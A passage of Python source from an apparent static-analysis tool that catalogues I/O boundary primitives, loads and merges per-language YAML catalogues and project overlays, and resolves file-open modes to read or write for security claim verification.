        no-module gate reject untyped *method* calls outright — a bare
        ``something.replace(...)`` cannot be verified against the catalogued
        receiver type (INV-tapat/INV-maluk).

        ``io_mode`` (also threaded from the edge's ``meta``) settles a
        DUAL-CLASSIFIED primitive. Without it this returned whichever row the
        catalogue happened to declare first, which made every ``open(p, "w")``
        an ``fs_read`` — a false negative on real writes.
        """
        # Qualified-name match always wins (exact). It can still be several
        # rows when the primitive is dual-classified, so the mode decides.
        qualified_hits = self._by_qualified_all.get(name)
        if qualified_hits:
            return select_by_mode(qualified_hits, io_mode)

        hits = self._by_short.get(name)
        if not hits:
            return None

        # If we have module context, filter matches
        if module_hint and module_hint != "external":
            filtered = [
                p for p in hits
                if _module_matches(p.module, module_hint)
            ]
            if filtered:
                return select_by_mode(filtered, io_mode)
            # No match with module filtering — this is likely NOT an IO
            # primitive (e.g., crypto/rand.Read is not net.Conn.Read)
            return None

        # INV-sapit: the SHORT-NAME fallback is the only path a first-party callable
        # can reach, and the only one it can be wrong on. The two paths above are safe
        # for it by construction — an exact qualified-name hit (``os.listdir``) names
        # the primitive outright, and the module filter above demands the hint agree —
        # which is why the refusal lives HERE and not at the top of the caller's loop.
        # Refusing the edge wholesale broke 50 tests that model a RESOLVED external
        # primitive (``python:/stdlib/os.py:100-102:os.listdir:function``): a real
        # stdlib call carrying a file-path module slot and a ``function`` kind, which
        # is indistinguishable from a first-party definition by kind alone and is
        # distinguished perfectly well by the qualified name it still carries.
        if not allow_short_name_fallback:
            return None

        # No module context — kind-aware gate (io-boundary:F3): an untyped
        # method call has no receiver evidence here, so a method-kind primitive
        # must not match; a free-function call may match a function-kind hit.
        return gate_named_entry(
            hits, name, module_hint, self.ambiguous_names,
            call_construct=call_construct,
        )

    def is_stdlib_module(self, module: str) -> bool:
        """Return True when ``module`` is a recognised stdlib module.

        RECOGNITION, NOT EXAMINATION — and the distinction is load-bearing
        enough that it cost a P0. This answers "does this name ship with the
        interpreter", which is what the supply-chain ecosystem classifier
        (``cli.py``'s ``_make_ecosystem_classifier``) and the Python dependency
        manifest filter (``py_deps.py``) need. It says NOTHING about whether
        this catalogue enumerated the module's I/O: 283 of Python's 300
        enumerated stdlib modules carry no primitive row at all. A caller
        asking "would I have SEEN this module's I/O" must use
        :meth:`module_io_is_enumerated` instead; ``verify_claims`` used this
        one for eight months and confirmed "never sends data over the network"
        for a program that opened ``telnetlib.Telnet`` and wrote a secret into
        it (INV-buzab).

        Match rules:
        - Exact match against :attr:`stdlib_modules` (the authoritative
          per-language interpreter list).
        - Prefix match against :attr:`stdlib_prefixes` — a prefix
          matches when ``module`` is exactly the prefix or starts with
          ``prefix + "."`` or ``prefix + "/"``. The two separators
          cover dot-namespaced languages (Python, Java) and slash-
          namespaced languages (Go's encoding/json).
        - Top-level-package fallback: a *submodule* of an enumerated
          top-level stdlib package is itself stdlib (``os.path``,
          ``unittest.mock``, ``urllib.request``). The Python catalog
          enumerates only top-level module names and declares no
          ``stdlib_prefixes``, so without this fallback every stdlib
          *submodule* import was mis-stamped ``ecosystem=third_party``
          (WI-bifih). Keyed on the first dotted/slashed segment, so a
          third-party ``requests.sessions`` (head ``requests`` not
          enumerated) correctly stays non-stdlib.

        Returns False when both sets are empty (the default state —
        before a catalog populates them).
        """
        if not module:
            return False
        if module in self.stdlib_modules:
            return True
        for prefix in self.stdlib_prefixes:
            if module == prefix:
                return True
            for sep in (".", "/"):
                if module.startswith(prefix + sep):
                    return True
        for sep in (".", "/"):
            head = module.partition(sep)[0]
            if head != module and head in self.stdlib_modules:
                return True
        return False

    def module_io_is_enumerated(self, module: str) -> bool:
        """Return True when this catalogue has ENUMERATED ``module``'s I/O surface.

        THE ONE PREDICATE ANY CONSUMER SHOULD ASK BEFORE TREATING SILENCE AS
        EVIDENCE. "No chains found in M" is an examined negative only if M's
        I/O was enumerated; otherwise it means "none I could see". Two adjacent
        predicates were used for that question and neither answers it:

        - :meth:`is_stdlib_module` answers "do I recognise this name". It
          permitted ``telnetlib``, ``ssl`` and ``ctypes`` — zero rows apiece —
          into a ``confirmed`` verdict (INV-buzab).
        - Row PRESENCE ("the catalogue declares some primitive for M") answers
          "have I catalogued ANY of M's I/O", which vouches for the rest of the
          module and for every OTHER boundary kind at once. ``os`` carries 40
          rows and none of them is ``os.open`` / ``os.write`` / ``os.sendfile``,
          so a program writing through ``os.open`` confirmed "never writes to
          the host filesystem" (INV-zubuh).

        MATCHING IS EXACT. Not a prefix, not a suffix, not a component. An
        earlier draft let a declaration propagate DOWN a separator — declaring
        ``urllib`` would vouch for ``urllib.request`` — on the reasoning that a
        closed-world claim about a package covers what is addressed through its
        name. That reasoning is wrong in at least three shipped languages and
        the draft's own worked example was one of the counterexamples:

        - ``urllib`` is a NAMESPACE package. ``urllib.request`` (opens URLs),
          ``urllib.parse`` (pure string work) and ``urllib.error`` are
          independent modules with unrelated I/O surfaces. Auditing one says
          nothing about the others, so the example promoted an unaudited
          network module on the strength of a string.
        - In Go the separator is not containment at all. ``crypto/tls``,
          ``os/exec`` and ``math/rand`` are independent packages; a declaration
          for ``math`` would have vouched for ``math/rand``, and one for ``os``
          for ``os/exec`` — the subprocess surface.
        - Rust and C++ namespace with ``::``, which the separator list did not
          even contain, so the rule was simultaneously too loose for Go and
          inert for Rust. A rule that is wrong in one direction for one
          language and absent for another is not one rule.

        So an auditor declares every module they actually audited, submodules
        included, and the predicate never infers a second module from a first.
        That is more authoring per unit of confirmability and it is the only
        version that means what it says.

        NOR IS IT A SUFFIX, which is the other half of the safety argument.
        :func:`_module_matches` — the boundary TAGGER's rule — matches trailing
        components, so ``unix`` finds ``golang.org/x/sys/unix``. The two stay
        separate on purpose: the tagger is permissive because a missed tag
        loses a finding, while this gate is strict because a wrong permit
        manufactures a false all-clear. Unifying them toward the tagger would
        make a cosmetic module-string respell a security-relevant edit.

        An empty ``stdlib_module_completeness`` therefore means "nothing has
        been enumerated", and every module blocks. That is the correct starting
        state for a catalogue nobody has audited, and it is what 13 of the 14
        shipped catalogues are in today.

        BOTH CONSUMERS OF THE CLOSED-WORLD CLAIM COME THROUGH HERE, because
        they are asking one question and a second home for it would drift. This
        replaced ``is_stdlib_module_complete``, whose sole caller was the F3
        Filter 2 ``external_potential`` skip — which asks the identical thing
        ("is an unmatched call into this module provably not I/O") and
        therefore wants the identical answer. With exact matching the two are
        behaviourally identical, so the fold carries no behaviour change at
        all; it removes the second home rather than trading one rule for
        another.
        """
        return bool(module) and module in self.stdlib_module_completeness

    def declares_opaque_crossing(self, module: str, name: str) -> bool:
        """Does ANY row for this primitive carry an opaque boundary (INV-gahuz)?

        ASKED OVER EVERY ROW, NOT OVER THE ONE ``classify_call`` RETURNED, and
        that distinction is the whole reason this method exists rather than a
        ``primitive.boundary in OPAQUE_BOUNDARIES`` test at the call site.
        ``lookup_with_module`` returns a SINGLE primitive, so a call catalogued
        under two boundaries is reported under whichever row is found first —
        and opacity can lose that race. Measured across all 14 shipped
        catalogues, 2 primitives are masked exactly this way, both in Scala:

            scala.sys.process.Process.apply  -> returned as fs_write
            scala.sys.process.Process.run    -> returned as fs_write

        Their own catalogue note says why the second row exists — *"Scala
        process execution (can write to filesystem via shell commands)"* — so
        the author correctly recorded that a launch may also write, and that
        very row then hid the launch. A boundary-blind ``examined`` shortcut
        reading only the first match would treat both as a known filesystem
        surface and permit a clean network verdict over a process launch.

        The rule is one-way on purpose: a primitive is opaque if ANY of its
        rows says so. Opacity is a property of what the call DOES (control
        leaves the process), and a second row naming an additional boundary
        adds information about that same call rather than retracting it.
        """
        return any(
            primitive.boundary in OPAQUE_BOUNDARIES
            and primitive.module == module
            and primitive.name == name
            for primitive in self.primitives
        )

    def merge(self, parent: IoBoundaryCatalog) -> IoBoundaryCatalog:
        """Merge a parent catalog into this one. Self's entries take precedence.

        Used for language inheritance (e.g. Scala inherits from Java):
        Scala-specific entries override Java entries with the same qualified
        name, while Java entries not present in Scala are added.

        ``stdlib_other`` is unioned across child and parent so a Kotlin
        project benefits from Java's enumerated stdlib non-IO symbols.
        ``status`` and ``stdlib_provenance`` stay on the child — the
        completeness claim belongs to the language whose catalog is
        being loaded, not the parent.

        F3 PR-C: ``stdlib_modules``, ``stdlib_prefixes`` and
        ``stdlib_module_completeness`` are also unioned across child
        and parent. Child entries win for ``stdlib_module_completeness``
        on key collision (the child language is what was loaded).
        """
        existing_qnames = {p.qualified_name for p in self.primitives}
        merged_primitives = list(self.primitives) + [
            p for p in parent.primitives
            if p.qualified_name not in existing_qnames
        ]
        merged_ambiguous = self.ambiguous_names | parent.ambiguous_names
        merged_stdlib_other = self.stdlib_other | parent.stdlib_other
        merged_stdlib_modules = self.stdlib_modules | parent.stdlib_modules
        # Dedupe prefixes while preserving child-first order.
        merged_prefix_list = list(self.stdlib_prefixes) + [
            p for p in parent.stdlib_prefixes
            if p not in self.stdlib_prefixes
        ]
        merged_completeness: dict[str, str] = dict(parent.stdlib_module_completeness)
        merged_completeness.update(self.stdlib_module_completeness)
        return IoBoundaryCatalog(
            language=self.language,
            primitives=merged_primitives,
            ambiguous_names=merged_ambiguous,
            status=self.status,
            stdlib_provenance=self.stdlib_provenance,
            stdlib_other=merged_stdlib_other,
            stdlib_modules=merged_stdlib_modules,
            stdlib_prefixes=tuple(merged_prefix_list),
            stdlib_module_completeness=merged_completeness,
        )

    @classmethod
    def from_yaml(cls, path: Path) -> IoBoundaryCatalog:
        """Load a catalog from a YAML file."""
        content = path.read_text(encoding="utf-8")
        data = yaml.safe_load(content) or {}
        return cls._from_dict(data)

    @classmethod
    def _from_dict(cls, data: dict[str, Any]) -> IoBoundaryCatalog:
        """Build a catalog from a parsed YAML dict.

        Plan C, PR B: validates ``status`` + ``stdlib_provenance`` and
        parses the new ``stdlib_other`` section. Hard-errors at load
        time on missing/invalid provenance for ``status: complete``
        catalogs (see :func:`_validate_catalog_dict`).
        """
        language = data.get("language", "unknown")
        status = data.get("status", "complete")
        provenance = data.get("stdlib_provenance")
        if provenance is not None and not isinstance(provenance, dict):
            raise ValueError(
                f"Catalog for {language!r} stdlib_provenance must be a "
                f"mapping, got {type(provenance).__name__}.",
            )
        _validate_catalog_dict(language, status, provenance)
        primitives: list[IoPrimitive] = []

        # Closed set of catalog-declarable boundary tags (single-sourced at
        # module level so verify_claims can validate against the same
        # vocabulary; see CATALOG_BOUNDARY_TYPES / KNOWN_IO_BOUNDARIES).
        for boundary in CATALOG_BOUNDARY_TYPES:
            entries = data.get(boundary, [])
            if not isinstance(entries, list):
                continue
            for entry in entries:
                if not isinstance(entry, dict):
                    continue
                module = entry.get("module", "")
                notes = entry.get("notes", "")
                # INV-zumin. Row-level rather than catalogue-level so it sits
                # beside the rows it qualifies; the cross-section agreement
                # check lives in ``simultaneous_boundaries_for``.
                simultaneous = bool(entry.get("simultaneous", False))

                for func_name in entry.get("functions", []):
                    primitives.append(IoPrimitive(
                        boundary=boundary,
                        module=module,
                        name=func_name,
                        kind="function",
                        notes=notes,
                        simultaneous=simultaneous,
                    ))
                for method_name in entry.get("methods", []):
                    primitives.append(IoPrimitive(
                        boundary=boundary,
                        module=module,
                        name=method_name,
                        kind="method",
                        notes=notes,
                        simultaneous=simultaneous,
                    ))
                for attr_name in entry.get("attributes", []):
                    primitives.append(IoPrimitive(
                        boundary=boundary,
                        module=module,
                        name=attr_name,
                        kind="attribute",
                        notes=notes,
                        simultaneous=simultaneous,
                    ))

        ambiguous = frozenset(data.get("ambiguous_names", []))

        # Plan C, PR B: parse stdlib_other (non-IO stdlib symbols).
        stdlib_other_set: set[str] = set()
        stdlib_other_entries = data.get("stdlib_other", [])
        if isinstance(stdlib_other_entries, list):
            for entry in stdlib_other_entries:
                if not isinstance(entry, dict):
                    continue
                module = entry.get("module", "")
                for kind_key in ("functions", "methods", "attributes"):
                    for sym_name in entry.get(kind_key, []):
                        stdlib_other_set.add(f"{module}.{sym_name}")

        # F3 PR-C: parse stdlib_modules (authoritative interpreter list).
        # Two YAML shapes are accepted: a flat list of strings ("os") and
        # a list of dicts with a ``module`` key plus an optional
        # ``completeness:`` flag and ``retrieved:`` date for the closed-
        # world gating of Filter 2.
        stdlib_modules_set: set[str] = set()
        completeness_map: dict[str, str] = {}
        stdlib_modules_raw = data.get("stdlib_modules", [])
        if isinstance(stdlib_modules_raw, list):
            for entry in stdlib_modules_raw:
                if isinstance(entry, str):
                    stdlib_modules_set.add(entry)
                elif isinstance(entry, dict):
                    name = entry.get("module")
                    if not isinstance(name, str) or not name:
                        continue
                    stdlib_modules_set.add(name)
                    if entry.get("completeness") == "complete":
                        retrieved = entry.get("retrieved")
                        if not isinstance(retrieved, str) or not retrieved:
                            raise ValueError(
                                f"Catalog for {language!r} stdlib_modules "
                                f"entry {name!r} declares completeness: "
                                f"complete but is missing a "
                                f"``retrieved:`` ISO date. Closed-world "
                                f"reasoning requires provenance.",
                            )
                        completeness_map[name] = retrieved

        # F3 PR-C: parse stdlib_prefixes (hierarchical-namespace languages).
        stdlib_prefixes_list: list[str] = []
        prefixes_raw = data.get("stdlib_prefixes", [])
        if isinstance(prefixes_raw, list):
            for entry in prefixes_raw:
                if isinstance(entry, str) and entry:
                    stdlib_prefixes_list.append(entry)

        # F3 PR-C: parse stdlib_module_completeness as an optional
        # top-level section, separate from stdlib_modules. This shape
        # keeps the operator script (which regenerates stdlib_modules
        # from the live interpreter) decoupled from the hand-curated
        # closed-world flags — the script never has to merge dict-form
        # entries it didn't author.
        completeness_section = data.get("stdlib_module_completeness", [])
        if isinstance(completeness_section, list):
            for entry in completeness_section:
                if not isinstance(entry, dict):
                    continue
                name = entry.get("module")
                if not isinstance(name, str) or not name:
                    continue
                # NO AUTO-PROMOTE INTO ``stdlib_modules``. This used to read
                # ``stdlib_modules_set.add(name)`` on the reasoning that
                # "adding to completeness implies the module is stdlib", which
                # conflates two different facts under one write: "I enumerated
                # this module's I/O" (an audit result) and "this name ships
                # with the interpreter" (provenance, feeding the supply-chain
                # ecosystem classifier and py_deps). ADR-0016 forbids exactly
                # that conflation for overlays — "a ``requests`` overlay must
                # not relabel a PyPI package as stdlib; that feeds the
                # dependency classifier and the F3 filter, and would be a
                # supply-chain misread rather than an I/O one" — and
                # :func:`load_overlay_catalog` enforces it by popping
                # ``stdlib_modules``. The auto-promote defeated that pop:
                # measured, an overlay carrying ONLY a
                # ``stdlib_module_completeness`` entry for ``requests`` made
                # ``is_stdlib_module("requests")`` return True on the merged
                # catalogue, while the same overlay spelling it
                # ``stdlib_modules:`` was correctly stripped. Behaviour-neutral
                # for the shipped catalogues: python.yaml's sole entry
                # (``math``) is already in the generated ``stdlib_modules``
                # block, and no other catalogue declares completeness at all.
                if entry.get("completeness") == "complete":
                    retrieved = entry.get("retrieved")
                    if not isinstance(retrieved, str) or not retrieved:
                        raise ValueError(
                            f"Catalog for {language!r} "
                            f"stdlib_module_completeness entry {name!r} "
                            f"declares completeness: complete but is "
                            f"missing a ``retrieved:`` ISO date. "
                            f"Closed-world reasoning requires provenance.",
                        )
                    completeness_map[name] = retrieved

        catalog = cls(
            language=language,
            primitives=primitives,
            ambiguous_names=ambiguous,
            status=status,
            stdlib_provenance=provenance,
            stdlib_other=frozenset(stdlib_other_set),
            stdlib_modules=frozenset(stdlib_modules_set),
            stdlib_prefixes=tuple(stdlib_prefixes_list),
            stdlib_module_completeness=completeness_map,
        )
        return catalog


# ---------------------------------------------------------------------------
# Catalog loading
# ---------------------------------------------------------------------------

_CATALOG_DIR = Path(__file__).parent / "io_primitives"

#: Status a PROJECT-LOCAL overlay must declare (INV-fotav). Deliberately
#: NOT one of the shipped catalogue statuses: ``complete`` asserts a
#: provenance-backed stdlib enumeration and ``in_progress`` asserts an
#: incomplete one, and an overlay is making neither claim — it describes
#: third-party surface hypergumbo does not own (ADR-0016 §27).
_OVERLAY_STATUS = "overlay"

# Languages that share an IO primitive catalog.  C++ uses C stdlib IO
# functions (fopen, fread, fwrite, popen, etc.) so it falls back to the
# C catalog.  TypeScript shares the JavaScript catalog.
_CATALOG_ALIASES: dict[str, str] = {
    "typescript": "javascript",
    # JVM languages that lack their own catalog share the Java IO catalog
    "groovy": "java",
}

# Languages with their own catalog that also inherit from a parent.
# The child catalog takes precedence; parent entries fill in the gaps.
# Kotlin needs this rather than a plain alias so kotlin.yaml can add
# Kotlin-specific stdlib / ktor / Android entries that have no Java
# analog (WI-rujos / UAT BUG-09d).
_CATALOG_PARENTS: dict[str, str] = {
    "scala": "java",
    "kotlin": "java",
    # Elixir inherits Erlang stdlib — `:gen_tcp.send` / `:file.read` /
    # `:ets.lookup` all call the Erlang modules directly (WI-vibur).
    "elixir": "erlang",
    # C++ inherits the C catalog (libc, POSIX) and the cpp.yaml child
    # adds the iostream surface (``std::cout`` / ``cerr`` / ``cin``).
    # Was a plain alias prior to WI-zojid — the alias form would have
    # required the C++-only ``module: std`` entries to live in c.yaml,
    # polluting the C-only catalog.
    "cpp": "c",
}


def is_language_supported(language: str) -> bool:
    """True if ``language`` has an I/O primitive catalog (directly, via
    alias, or with a parent). Callers use this to distinguish "found
    zero I/O" from "language unsupported" — the INV-javam invariant.
    """
    return load_catalog(language).is_supported


class IoPrimitiveOverlayError(Exception):
    """A project-local I/O primitive overlay could not be loaded.

    Its own exception type so callers can map it to the "inconclusive" exit
    rather than to a crash or, worse, to silence: a mistyped overlay path that
    degraded to "no extra primitives" would read exactly like a clean repo,
    which is the failure direction this project spends most of its gates on.
    """


def load_overlay_catalog(path: Path) -> IoBoundaryCatalog:
    """Load a PROJECT-LOCAL I/O primitive overlay from ``path``.

    ADR-0016 scopes the built-in catalogue to the stdlib deliberately — "a
    curated list of stdlib functions, not an unbounded set of library APIs"
    (§27) — because owning every third-party library's API surface is an
    unbounded maintenance burden. An overlay is how a project supplies the
    third-party half WITHOUT hypergumbo taking ownership of it.

    THE CONTRACT IS THE TAINT ARM'S, DELIBERATELY. ADR-0017 already granted
    project-local catalogues to taint (§370: "any project can define its own
    taint sources, sinks, and sanitizers ... with project-local entries taking
    precedence"), shipped as ``--taint-sources`` and friends. That pattern was
    never extended to boundaries; this is that extension, with the same
    precedence semantics and the same error posture, rather than a second
    mechanism that would drift from it.

    An overlay declares ``status: overlay``. It may NOT declare
    ``status: complete``: that status asserts a provenance-backed enumeration of
    a language's stdlib, and letting an overlay claim it would launder
    third-party rows into the standing of the curated catalogue. It carries no
    ``stdlib_modules`` either — see :func:`load_catalog` for why that matters.
    """
    if not path.exists():
        raise IoPrimitiveOverlayError(
            f"I/O primitive overlay not found: {path}",
        )
    try:
        data = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    except yaml.YAMLError as exc:
        raise IoPrimitiveOverlayError(
            f"I/O primitive overlay {path} is not valid YAML: {exc}",
        ) from exc
    if not isinstance(data, dict):
        raise IoPrimitiveOverlayError(
            f"I/O primitive overlay {path} must be a mapping at the top level, "
            f"got {type(data).__name__}.",
        )
    status = data.get("status")
    if status != _OVERLAY_STATUS:
        raise IoPrimitiveOverlayError(
            f"I/O primitive overlay {path} must declare "
            f"status: {_OVERLAY_STATUS!r}, got {status!r}. "
            f"'complete' asserts a provenance-backed stdlib enumeration and is "
            f"not available to a project-local overlay.",
        )
    if data.get("stdlib_module_completeness"):
        raise IoPrimitiveOverlayError(
            f"I/O primitive overlay {path} declares "
            f"stdlib_module_completeness, which is not available to a "
            f"project-local overlay. A closed-world entry is what lets "
            f"verify-claims answer 'confirmed' about the calls it could not "
            f"classify, so it grants strictly MORE than the "
            f"'status: complete' this loader already refuses. Supply "
            f"primitive ROWS instead — narrower, NOT safer: a row vouches "
            f"for one named call surface, a completeness entry vouches for "
            f"every call the catalogue could not classify. A row still "
            f"decides verdicts, so a wrong boundary on one is a wrong "
            f"verdict (INV-zosun).",
        )
    # Hand ``_from_dict`` a status it accepts; the overlay marker has already
    # done its job (refusing a completeness claim) and must not reach the
    # stdlib-provenance validator, which exists for the shipped catalogues.
    #
    # WHY THE COMPLETENESS REFUSAL IS AN ERROR AND NOT A POP. The two lines
    # below drop stdlib-provenance fields silently, which is right for them:
    # they are inert in an overlay and dropping one changes nothing a user
    # asked for. A completeness entry is the opposite — it is the single grant
    # of confirmability (INV-buzab), so silently discarding it would leave the
    # author believing they had vouched for a module. Measured before this
    # refusal existed: a SIX-LINE overlay with zero primitive rows and one
    # completeness entry for ``telnetlib`` turned the INV-buzab exfiltration
    # fixture — which opens a telnet session and writes ``os.environ["API_KEY"]``
    # into it — from ``inconclusive`` rc 2 back to ``confirmed`` rc 0, disclosed
    # by nothing but a stderr line naming the overlay path.
    payload = dict(data)
    payload["status"] = "in_progress"
    payload.pop("stdlib_modules", None)
    payload.pop("stdlib_prefixes", None)
    try:
        catalog = IoBoundaryCatalog._from_dict(payload)
    except ValueError as exc:
        raise IoPrimitiveOverlayError(
            f"I/O primitive overlay {path} is invalid: {exc}",
        ) from exc
    return catalog


def load_catalog(
    language: str,
    overlay_paths: Optional[Sequence[Path]] = None,
) -> IoBoundaryCatalog:
    """Load the I/O primitive catalog for a language.

    Looks for ``io_primitives/<language>.yaml`` relative to this module.
    Falls back to language aliases (e.g. cpp → c) if no exact match.
    When a language has a parent catalog (e.g. scala → java), the child
    catalog is loaded first and then merged with the parent so that
    child entries take precedence while parent entries fill in gaps.
    Returns an empty catalog if no catalog is found.

    ``overlay_paths`` layers project-local overlays on top (INV-fotav), in
    ASCENDING precedence — the last path wins a qualified-name collision, so a
    caller passes claims-file extras before CLI flags and gets the taint arm's
    ordering for free. Merging reuses :meth:`IoBoundaryCatalog.merge`, the same
    child-over-parent primitive language inheritance already uses; there is one
    merge rule here, not two.

    STDLIB MEMBERSHIP IS DELIBERATELY NOT WIDENED. ``load_overlay_catalog``
    drops ``stdlib_modules`` / ``stdlib_prefixes`` from an overlay, so
    ``is_stdlib_module`` keeps answering about the actual interpreter. A
    ``requests`` overlay must not make ``requests`` classify as stdlib — that
    feeds the dependency classifier and the F3 boundary filter, and relabelling
    a PyPI package as stdlib is a supply-chain misread, not an I/O one.
    """
    path = _CATALOG_DIR / f"{language}.yaml"
    if not path.exists():
        alias = _CATALOG_ALIASES.get(language)
        if alias:
            path = _CATALOG_DIR / f"{alias}.yaml"
    if not path.exists():
        # INV-javam: no catalog file (and no alias resolving to one) —
        # callers use is_supported to emit explicit "language
        # unsupported" output instead of silently returning zero I/O.
        return IoBoundaryCatalog(language=language, is_supported=False)
    catalog = IoBoundaryCatalog.from_yaml(path)

    # Merge parent catalog if defined (e.g. scala inherits java entries)
    parent_lang = _CATALOG_PARENTS.get(language)
    if parent_lang:
        parent_path = _CATALOG_DIR / f"{parent_lang}.yaml"
        if parent_path.exists():
            parent_catalog = IoBoundaryCatalog.from_yaml(parent_path)
            catalog = catalog.merge(parent_catalog)

    for overlay_path in overlay_paths or ():
        overlay = load_overlay_catalog(Path(overlay_path))
        if overlay.language and overlay.language != catalog.language:
            raise IoPrimitiveOverlayError(
                f"I/O primitive overlay {overlay_path} declares language "
                f"{overlay.language!r} but was loaded for "
                f"{catalog.language!r}. Applying it would attribute I/O to the "
                f"wrong tree.",
            )
        # ``merge`` is self-over-argument, so the overlay is the receiver: a
        # later overlay outranks an earlier one and both outrank the built-in.
        catalog = overlay.merge(catalog)

    return catalog


def in_progress_languages(languages: Iterable[str]) -> list[str]:
    """Return the subset of ``languages`` whose io_primitives catalog is
    marked ``status: in_progress`` (WI-najil).

    A consumer of the io-boundary catalog (``hypergumbo io-boundaries`` /
    ``verify-claims`` / ``slice --io-boundary``) uses this to disclose that
    boundary results for those languages may be incomplete: an ``in_progress``
    catalog's zero-match outcome is otherwise indistinguishable from a genuine
    "no I/O in this code". Unsupported languages (no catalog file, even via
    alias) are excluded — :func:`load_catalog` returns a fallback object whose
    ``status`` defaults to ``"complete"`` (they carry the separate
    ``is_supported=False`` signal, INV-javam), so the ``status == "in_progress"``
    test cleanly drops them. Aliases and parents resolve through
    :func:`load_catalog` (e.g. ``typescript`` reports the ``javascript``
    catalog's status). The result is sorted and de-duplicated.
    """
    return sorted({
        lang for lang in languages
        if load_catalog(lang).status == "in_progress"
    })


# ---------------------------------------------------------------------------
# Edge matching
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Mode-argument discrimination for dual-classified primitives
# ---------------------------------------------------------------------------
#
# Some primitives are catalogued under two boundaries because the CALL decides
# which applies. ``python.yaml`` has said so in prose since it was written —
# "Dual-classified: fs_read when mode is 'r'/'rb' (default), fs_write when
# 'w'/'a'/'x'" — but ``notes`` is free text nothing consumes, so the rule was
# documented and unimplemented, and it failed in BOTH directions at once:
# ``io-boundaries`` called every ``open()`` a read (missing real writes) while
# the taint sink derivation called every ``open()`` a write (24 of 35 distinct
# violations of the shipped ``runtime-cli-no-host-fs`` claim were read-mode
# ``open()`` calls). Fixing one side alone moves the error instead of removing
# it, so the rule lives here once and both consumers route through it.
#
# ONLY the fs_read/fs_write pair qualifies. Other dual classifications in the
# catalogues are different shapes that a mode literal cannot settle and must
# not be swept in here: ``gen_udp.open`` is net_recv+net_send because one call
# genuinely does both; ``unistd.read`` is fs_read+ipc_recv+net_recv because
# the fd's kind is not knowable at the call site.
_MODE_DISCRIMINATED_PAIR = frozenset({"fs_read", "fs_write"})

# A mode string means "can write" if any of these appear in it. ``+`` is
# included deliberately: ``r+`` opens for update, and a security claim about
# filesystem writes cares that the handle CAN write, not that the caller
# happened to describe it as a read.
_WRITE_MODE_CHARS = frozenset("wax+")


def resolve_mode_boundary(io_mode: Optional[str]) -> str:
    """Map an ``open``-style mode string to ``fs_read`` or ``fs_write``.

    ``None`` means the mode was not a statically-readable literal — either
    absent (``open(p)``, which Python defaults to ``"r"``) or computed
    (``open(p, m)``). Both resolve to ``fs_read``: absence IS evidence
    because the language documents the default, and a computed mode is
    ignorance, which licenses nothing. Guessing ``fs_write`` from ignorance
    would re-create the false-positive population this exists to remove.
    """
    if not io_mode:
        return "fs_read"
    return (
        "fs_write"
        if _WRITE_MODE_CHARS & set(io_mode)
        else "fs_read"
    )


def mode_discriminated_names(catalog: IoBoundaryCatalog) -> frozenset[str]:
    """Short names in ``catalog`` classified under BOTH fs_read and fs_write.

    DERIVED from the catalogue rather than listed in code, so a language that
    declares a new dual-classified primitive gets discrimination without a
    code change and hypergumbo cannot drift from its own data. Returns short
    names because that is what an emitter has at the call site — it knows it
    is looking at ``open(...)`` before it knows the receiver resolves to
    ``builtins``.
    """
    by_name: dict[str, set[str]] = {}
    for p in catalog.primitives:
        by_name.setdefault(p.name, set()).add(p.boundary)
    return frozenset(
        name
        for name, boundaries in by_name.items()
        if _MODE_DISCRIMINATED_PAIR <= boundaries
    )


def select_by_mode(
    candidates: Sequence[IoPrimitive],
    io_mode: Optional[str],
) -> Optional[IoPrimitive]:
    """Pick the row matching ``io_mode`` from a dual-classified candidate set.

    The single predicate both the boundary tagger and the taint sink matcher
    consume. A single candidate is returned unchanged — the overwhelming
    majority of primitives are not dual-classified and must not pay for this.
    """
    if not candidates:
        return None
    if len(candidates) == 1:
        return candidates[0]
    wanted = resolve_mode_boundary(io_mode)
    for cand in candidates:
        if cand.boundary == wanted:
            return cand
    return candidates[0]


def match_edge_to_primitive(
    catalog: IoBoundaryCatalog,
    callee_name: str,
) -> Optional[IoPrimitive]:
    """Match a call-edge target name against the I/O primitive catalog.

    Tries qualified name first, then short (unqualified) name. Returns
    the first match or None.
    """
    return catalog.lookup(callee_name)


# ---------------------------------------------------------------------------
# Boundary map computation (ADR-0016 Phase 1c)
# ---------------------------------------------------------------------------


@dataclass
class IoChain:
    """A call chain from an entry point to an I/O boundary call.

    Attributes:
        boundary: The I/O boundary type (e.g., "fs_read").
        primitive: The matched I/O primitive qualified name.
        io_edge_src: The symbol ID of the caller of the I/O primitive.
        io_edge_dst: The symbol ID of the I/O primitive itself.
        entry_points: Set of entry-point symbol IDs that can reach this I/O call.
        dst_tier: ``supply_chain.tier`` of the io_edge_dst symbol when known.
            None when the caller did not pass a ``nodes_by_id`` lookup or the
            dst is not present in the lookup (pre-PR1 JSON files lack
            external boundary nodes).
        dst_tier_name: Human-readable tier name (``"first_party"`` /
            ``"internal_dep"`` / ``"external_dep"`` / ``"derived"``).
        dst_external_boundary: True when the dst is a synthetic
            ``meta.external_boundary`` node (i.e., the call reaches into
            code that hypergumbo did not analyze).
        dst_classification_unreliable: Plan C, PR C — set on
            ``boundary="external_potential"`` chains whose source
            language has ``status: in_progress``. The chain is emitted
            because the dst is an external boundary node, but absence
            from the (incomplete) catalog does not authoritatively mean
            the dst is third-party — the language's stdlib enumeration
            isn't yet provenance-validated.
    """

    boundary: str
    primitive: str
    io_edge_src: str
    io_edge_dst: str
    entry_points: list[str] = field(default_factory=list)
    dst_tier: Optional[int] = None
    dst_tier_name: Optional[str] = None
    dst_external_boundary: bool = False
    dst_classification_unreliable: bool = False

    def to_dict(self) -> dict[str, Any]:
        """Serialize to JSON-friendly dict including high-risk flag."""
        return {
            "boundary": self.boundary,
            "primitive": self.primitive,
            "io_edge_src": self.io_edge_src,
            "io_edge_dst": self.io_edge_dst,
            "entry_points": self.entry_points,
            "high_risk": is_high_risk(self.primitive),
            "dst_tier": self.dst_tier,
            "dst_tier_name": self.dst_tier_name,
            "dst_external_boundary": self.dst_external_boundary,
            "dst_classification_unreliable": (
                self.dst_classification_unreliable
            ),
        }


@dataclass
class BoundaryMapEntry:
    """Aggregated boundary map for one boundary type.

    Attributes:
        boundary: The I/O boundary type.
        chains: Individual I/O chains reaching this boundary.
        entry_points: Deduplicated entry-point symbol IDs across all chains.
        primitives_used: Deduplicated I/O primitive names across all chains.
    """

    boundary: str
    chains: list[IoChain] = field(default_factory=list)
    entry_points: list[str] = field(default_factory=list)
    primitives_used: list[str] = field(default_factory=list)
